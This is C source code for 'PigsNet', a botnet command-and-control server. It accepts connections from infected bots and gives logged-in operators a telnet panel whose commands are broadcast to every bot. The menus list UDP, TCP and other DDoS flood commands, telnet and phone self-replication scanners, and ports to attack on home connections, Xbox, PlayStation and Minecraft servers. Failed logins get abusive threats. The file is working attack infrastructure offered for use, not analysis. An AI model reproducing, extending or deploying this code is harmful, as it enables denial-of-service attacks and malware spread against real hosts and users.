/*
  ____ ___ ____ ____  _   _ _____ _____ 
 |  _ \_ _/ ___/ ___|| \ | | ____|_   _|
 | |_) | | |  _\___ \|  \| |  _|   | |  
 |  __/| | |_| |___) | |\  | |___  | |  
 |_|  |___\____|____/|_| \_|_____| |_|  
 @PigyNets - Instagram
 
 
VERSION 3.0

Updates:

 1. Edited banner a little.
 2. Added a failed login screen.
 3. Logs IPs
 4. Blocked SHELL commands.


LOGIN FILE IS login.txt
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

#define MAXFDS 1000000
#define RED     "\x1b[0;31m"
#define GREEN   "\x1b[0;32m"
#define C_RESET   "\x1b[0m"

struct account {
    char id[20]; 
    char password[20];
};
static struct account accounts[25];

struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];

struct telnetdata_t {
        uint32_t ip; 
        int connected;
} managements[MAXFDS];

////////////////////////////////////

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;

////////////////////////////////////


int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}


static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}


static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {                     
						send(i, "\x1b[37m", 8, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 1, MSG_NOSIGNAL);
                }
				printf("sent to fd: %d\n", i);
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[37m> ", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
 
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
 
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
 
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
 
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, "!* SC ON\n", 9, MSG_NOSIGNAL);
                                        
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) {
                                                continue; }
                                                printf("buf: \"%s\"\n", buf); }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
 
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0; PigsNet - Bots: %d - Admins: %d %c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
 
                sleep(2);
        }
}

int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 void client_addr(struct sockaddr_in addr){
        printf("IP:%d.%d.%d.%d\n",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        FILE *logFile;
        logFile = fopen("server.log", "a");
        fprintf(logFile, "\nIP:%d.%d.%d.%d ",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
}

void *telnetWorker(void *sock) { 
        int thefd = (int)sock;
        managesConnected++;
        int find_line;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char usernamez[80];
        char* password;
        char* admin;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);

        FILE *fp;
        int i=0;
        int c;
        fp=fopen("login.txt", "r"); // format: user pass
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
        { 
            fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
            ++j;
        }
        sprintf(botnet, "\x1b[1;37mLogin:\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;  
		sprintf(botnet, "\033[1;37mUsername\033[33;3m: \e[0;30m");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);

        if(strcmp(nickstring, accounts[find_line].id) == 0){                  
        sprintf(botnet, "\033[1;32mPassword\033[33;3m: \e[0;30m");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
		char failed_line1[100];
		char failed_line2[100];
		char failed_line3[100];
		char failed_line4[100];
		char failed_line5[100];
		char failed_line6[100];
		char failed_line7[100];
		char failed_line8[100];
		char failed_line9[100];
		char failed_line10[100];
		char failed_line11[100];
		char failed_line12[100];

        sprintf(failed_line1, "\x1b[1;36m   You are not welcomed here.  \r\n");
        sprintf(failed_line2, "\x1b[1;36m   Im going to release the pigs, bitch.  \r\n");
		sprintf(failed_line3, "\x1b[1;36m   You better run, you you surely can not hide your IP address. \r\n");
		sprintf(failed_line4, "\x1b[1;36m   Your IP has been logged. The pigs are going to slam your ass. \r\n");
		sprintf(failed_line5, "\x1b[1;36m    ONE ...\r\n");
		sprintf(failed_line6, "\x1b[1;36m    TWO ...\r\n");
		sprintf(failed_line7, "\x1b[1;36m    THREE ...\r\n");
		sprintf(failed_line8, "\x1b[1;36m    Oink Oink bitch. #Offline.\r\n");
		if(send(thefd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, failed_line2, strlen(failed_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, failed_line3, strlen(failed_line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, failed_line4, strlen(failed_line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, failed_line5, strlen(failed_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, failed_line6, strlen(failed_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, failed_line7, strlen(failed_line7), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, failed_line8, strlen(failed_line8), MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		if(send(thefd, failed_line5, strlen(failed_line9), MSG_NOSIGNAL) == -1) goto end;
		sleep(3);
		if(send(thefd, failed_line6, strlen(failed_line10), MSG_NOSIGNAL) == -1) goto end;
		sleep(3);
		if(send(thefd, failed_line7, strlen(failed_line11), MSG_NOSIGNAL) == -1) goto end;
		sleep(3);
		if(send(thefd, failed_line8, strlen(failed_line12), MSG_NOSIGNAL) == -1) goto end;
		sleep(3);
        goto end;
		
        fak:
        pthread_create(&title, NULL, &titleWriter, sock);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end;
		char ascii_banner_line19 [5000];
        char ascii_banner_line20 [5000];
		char ascii_banner_line21 [5000];
		char ascii_banner_line22 [5000];
		char ascii_banner_line23 [5000];
		char ascii_banner_line24 [5000];
		char ascii_banner_line25 [5000];
		char ascii_banner_line26 [5000];
		char line23[80];
		
        sprintf(ascii_banner_line19, "\x1b[1;37m                                                                    \r\n");
		sprintf(ascii_banner_line20, "\x1b[1;32m             ██████╗ ██╗ ██████╗ ███████╗███╗   ██╗███████╗████████╗\r\n");
		sprintf(ascii_banner_line21, "\x1b[1;37m             ██╔══██╗██║██╔════╝ ██╔════╝████╗  ██║██╔════╝╚══██╔══╝\r\n");
		sprintf(ascii_banner_line22, "\x1b[1;32m             ██████╔╝██║██║  ███╗███████╗██╔██╗ ██║█████╗     ██║   \r\n");
		sprintf(ascii_banner_line23, "\x1b[1;37m             ██╔═══╝ ██║██║   ██║╚════██║██║╚██╗██║██╔══╝     ██║   \r\n");
		sprintf(ascii_banner_line24, "\x1b[1;32m             ██║     ██║╚██████╔╝███████║██║ ╚████║███████╗   ██║   \r\n");
		sprintf(ascii_banner_line25, "\x1b[1;37m             ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝   \r\n");
		sprintf(ascii_banner_line26, "\x1b[1;37m                                                                    \r\n");
		sprintf(line23, "\x1b[1;32mWelcome to PigsNet, \x1b[1;37mType HELP.\r\n");
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line19, strlen(ascii_banner_line19), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line20, strlen(ascii_banner_line20), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line21, strlen(ascii_banner_line21), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line22, strlen(ascii_banner_line22), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line23, strlen(ascii_banner_line23), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line24, strlen(ascii_banner_line24), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line25, strlen(ascii_banner_line25), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line26, strlen(ascii_banner_line26), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line23, strlen(line23), MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
        while(fdgets(buf, sizeof buf, thefd) > 0)
        { 
        if(strstr(buf, "BOTS")) 
        {  
          sprintf(botnet, "\x1b[1;32mBots: %d | \x1b[1;37mAdmins: %d\r\n", clientsConnected(), managesConnected);
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
          
if(strstr(buf, "HELP")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char helpline1  [80];
				char helpline2  [80];
				char helpline3  [80];
				char helpline4  [80];
				char helpline5  [80];

				sprintf(helpline1,  "\x1b[1;37m[-] Choose an option from \x1b[1;32mBelow:\r\n");
				sprintf(helpline2,  "\x1b[1;32mDDOS\x1b[1;37m - DDOS Commands\r\n");
				sprintf(helpline3,  "\x1b[1;32mSELFREP\x1b[1;37m - DONT FUCKING TOUCH THIS SHIT\r\n");
				sprintf(helpline4,  "\x1b[1;32mRULES\x1b[1;37m - NET's RULES.\r\n");
				sprintf(helpline5,  "\x1b[1;32mPORTS\x1b[1;37m - GOOD PORTS TO HIT.\r\n");

				if(send(thefd, helpline1,  strlen(helpline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, helpline2,  strlen(helpline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, helpline3,  strlen(helpline3),	MSG_NOSIGNAL) == -1) goto end;
			    if(send(thefd, helpline4,  strlen(helpline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, helpline5,  strlen(helpline5),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[1;32m> \x1b[1;37m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
		}
					if(strstr(buf, "DDOS")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char ddosline1  [80];
				char ddosline2  [80];
				char ddosline3  [80];
				char ddosline4  [80];
				char ddosline5  [80];
				sprintf(ddosline1, "\x1b[1;37m !* UDP [IP] [PORT] [TIME] 32 1337 400 | UDP FLOOD\r\n");
				sprintf(ddosline2, "\x1b[1;37m !* STD [IP] [PORT] [TIME] | STD FLOOD\r\n");
				sprintf(ddosline3, "\x1b[1;37m !* TCP [IP] [PORT] [TIME] 32 all 1337 400| TCP FLOOD\r\n");
				sprintf(ddosline4, "\x1b[1;37m !* CNC [IP] [ADMIN-PORT] [TIME] | CNC FLOOD\r\n");
				sprintf(ddosline5, "\x1b[1;37m !* KILLATTK | KILLS ALL ATTACKS\r\n");

				if(send(thefd, ddosline1,  strlen(ddosline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline2,  strlen(ddosline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline3,  strlen(ddosline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline4,  strlen(ddosline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline5,  strlen(ddosline5),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[1;32m> \x1b[1;37m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "SELFREP")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char repline1  [80];
				char repline2  [80];
				char repline3  [80];
				char repline4  [80];
				char repline5  [80];
				char repline6  [80];
				
				sprintf(repline1,  "\x1b[1;37m !* PHONE ON | TURNS ON PHONE SELF REPLIFICATION\r\n");
				sprintf(repline2,  "\x1b[1;32m !* SCANNER ON | TURNS ON TELNET SELF REPLIFICATION\r\n");
				sprintf(repline3,  "\x1b[1;37m !* PHONE OFF | TURNS OFF PHONE SELF REPLIFICATION\r\n");
				sprintf(repline4,  "\x1b[1;32m !* SCANNER OFF | TURNS OFF TELNET SELF REPLIFICATION\r\n");
				sprintf(repline5,  "\x1b[1;37m !* wget.py | SCANS sithbots.txt PYTHON LIST\r\n");
				sprintf(repline6,  "\x1b[1;32m !* PYTHON OFF | TURNS OFF PYTHON SCANNER\r\n");

				if(send(thefd, repline1,  strlen(repline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline2,  strlen(repline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline3,  strlen(repline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline4,  strlen(repline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline5,  strlen(repline5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline6,  strlen(repline6),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[1;32m> \x1b[1;37m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "RULES")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char rulesline1  [80];
				char rulesline2  [80];
				char rulesline3  [80];
				char rulesline4  [80];
				char rulesline5  [80];
				
				sprintf(rulesline1,  "\x1b[1;32m [-] RULES.\r\n");
				sprintf(rulesline2,  "\x1b[1;37m 1. No spamming attacks or chat. \r\n");
				sprintf(rulesline3,  "\x1b[1;37m 2. No hitting Government IP's or shit.\r\n");
				sprintf(rulesline4,  "\x1b[1;37m 3. Max boot time is 600, only use 600 when absolutely necessary.\r\n");
				sprintf(rulesline5,  "\x1b[1;37m 4. If something doesnt go down, its protected. Stop trying to spam it.\r\n");

				if(send(thefd, rulesline1,  strlen(rulesline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, rulesline2,  strlen(rulesline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, rulesline3,  strlen(rulesline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, rulesline4,  strlen(rulesline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, rulesline5,  strlen(rulesline5),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[1;32m> \x1b[1;37m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "PORTS")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char portline1  [80];
				char portline2  [80];
				char portline3  [80];
				char portline4  [80];
				char portline5  [80];
				char portline6  [80];
				char portline7  [80];
				
				sprintf(portline1,  "\x1b[1;32m [-] Common ports.\r\n");
				sprintf(portline2,  "\x1b[1;37m 1. Home connections: 80, 3074\r\n");
				sprintf(portline3,  "\x1b[1;37m 2. Servers: 80, 53\r\n");
				sprintf(portline4,  "\x1b[1;32m [-] Games ports.\r\n");
				sprintf(portline5,  "\x1b[1;37m 1. Minecraft servers: 25565\r\n");
				sprintf(portline6,  "\x1b[1;37m 2. Xbox: 88 or 3074\r\n");
				sprintf(portline7,  "\x1b[1;37m 2. Playstation: 443, 3478, 3479, 8080\r\n");

				if(send(thefd, portline1,  strlen(portline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, portline2,  strlen(portline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, portline3,  strlen(portline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, portline4,  strlen(portline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, portline5,  strlen(portline5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, portline6,  strlen(portline6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, portline7,  strlen(portline7),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[1;32m> \x1b[1;37m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
	    if(strstr(buf, "LOGOUT")) 
		{  
		printf("BYE %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("LOGOUT.log", "a");
        fprintf(logFile, "BYE %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
		if(strstr(buf, "SH")) 
		{  
		printf("ATTEMPT TO SHELL YOUR BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("SHELL.log", "a");
        fprintf(logFile, "ATTEMPT TO SHELL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
   	   	}
		if(strstr(buf, "MOVE")) 
		{  
		printf("ATTEMPT TO SHELL YOUR BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("SHELL.log", "a");
        fprintf(logFile, "ATTEMPT TO SHELL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
   	   	}
        if (strstr(buf, "CLEAR"))
        { 
          if(send(thefd, "\033[1A\033[2J\033[1;1H\r\n", 16, MSG_NOSIGNAL) == -1) goto end;
		  
        sprintf(ascii_banner_line19, "\x1b[1;37m                                                                    \r\n");
		sprintf(ascii_banner_line20, "\x1b[1;32m             ██████╗ ██╗ ██████╗ ███████╗███╗   ██╗███████╗████████╗\r\n");
		sprintf(ascii_banner_line21, "\x1b[1;37m             ██╔══██╗██║██╔════╝ ██╔════╝████╗  ██║██╔════╝╚══██╔══╝\r\n");
		sprintf(ascii_banner_line22, "\x1b[1;32m             ██████╔╝██║██║  ███╗███████╗██╔██╗ ██║█████╗     ██║   \r\n");
		sprintf(ascii_banner_line23, "\x1b[1;37m             ██╔═══╝ ██║██║   ██║╚════██║██║╚██╗██║██╔══╝     ██║   \r\n");
		sprintf(ascii_banner_line24, "\x1b[1;32m             ██║     ██║╚██████╔╝███████║██║ ╚████║███████╗   ██║   \r\n");
		sprintf(ascii_banner_line25, "\x1b[1;37m             ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝   \r\n");
		sprintf(ascii_banner_line26, "\x1b[1;37m                                                                    \r\n");
		sprintf(line23, "\x1b[1;32mWelcome to PigsNet, \x1b[1;37mType HELP.\r\n");
		if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line19, strlen(ascii_banner_line19), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line20, strlen(ascii_banner_line20), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line21, strlen(ascii_banner_line21), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line22, strlen(ascii_banner_line22), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line23, strlen(ascii_banner_line23), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line24, strlen(ascii_banner_line24), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line25, strlen(ascii_banner_line25), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line26, strlen(ascii_banner_line26), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line23, strlen(line23), MSG_NOSIGNAL) == -1) goto end;
         }
         if (strstr(buf, "EXIT")) 
         {
            goto end;
         }
                trim(buf);
                sprintf(botnet, "\x1b[0m~\x1b[1;32m> \x1b[0;37m");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].id, buf);
                FILE *logFile;
                logFile = fopen("server.log", "a");
                fprintf(logFile, "%s: \"%s\"\n", accounts[find_line].id, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
 
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
 
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {  printf("Security Breach From: ");
                
                client_addr(cli_addr);
                FILE *logFile;
                logFile = fopen("IP.log", "a");
                fprintf(logFile, "IP:%d.%d.%d.%d\n",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
                fclose(logFile);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
 
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
                exit (EXIT_FAILURE);

        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
        if (threads > 1000)
        {
            printf("Are You Dumb? Lower the Threads\n");
            return 0;
        }
        else if (threads < 1000)
        {
            printf("Good Choice in Threading\n");
        }
        printf(RED "\x1b[0;31mPigsNet v3,\x1b[1;37m PiggyNets on IG, \x1b[1;37mEnjoy \x1b[1;37mSUCCESSFULLY \x1b[1;36mSCREENED\x1b[0m\n");
        listenFD = create_and_bind(argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort();
        
 
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
 
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
 
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
 
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
 
        pthread_create(&thread[0], NULL, &telnetListener, port);
 
        while(1)
        {
                broadcast("PING", -1, "STRING");
                sleep(60);
        }
  
        close (listenFD);
 
        return EXIT_SUCCESS;
}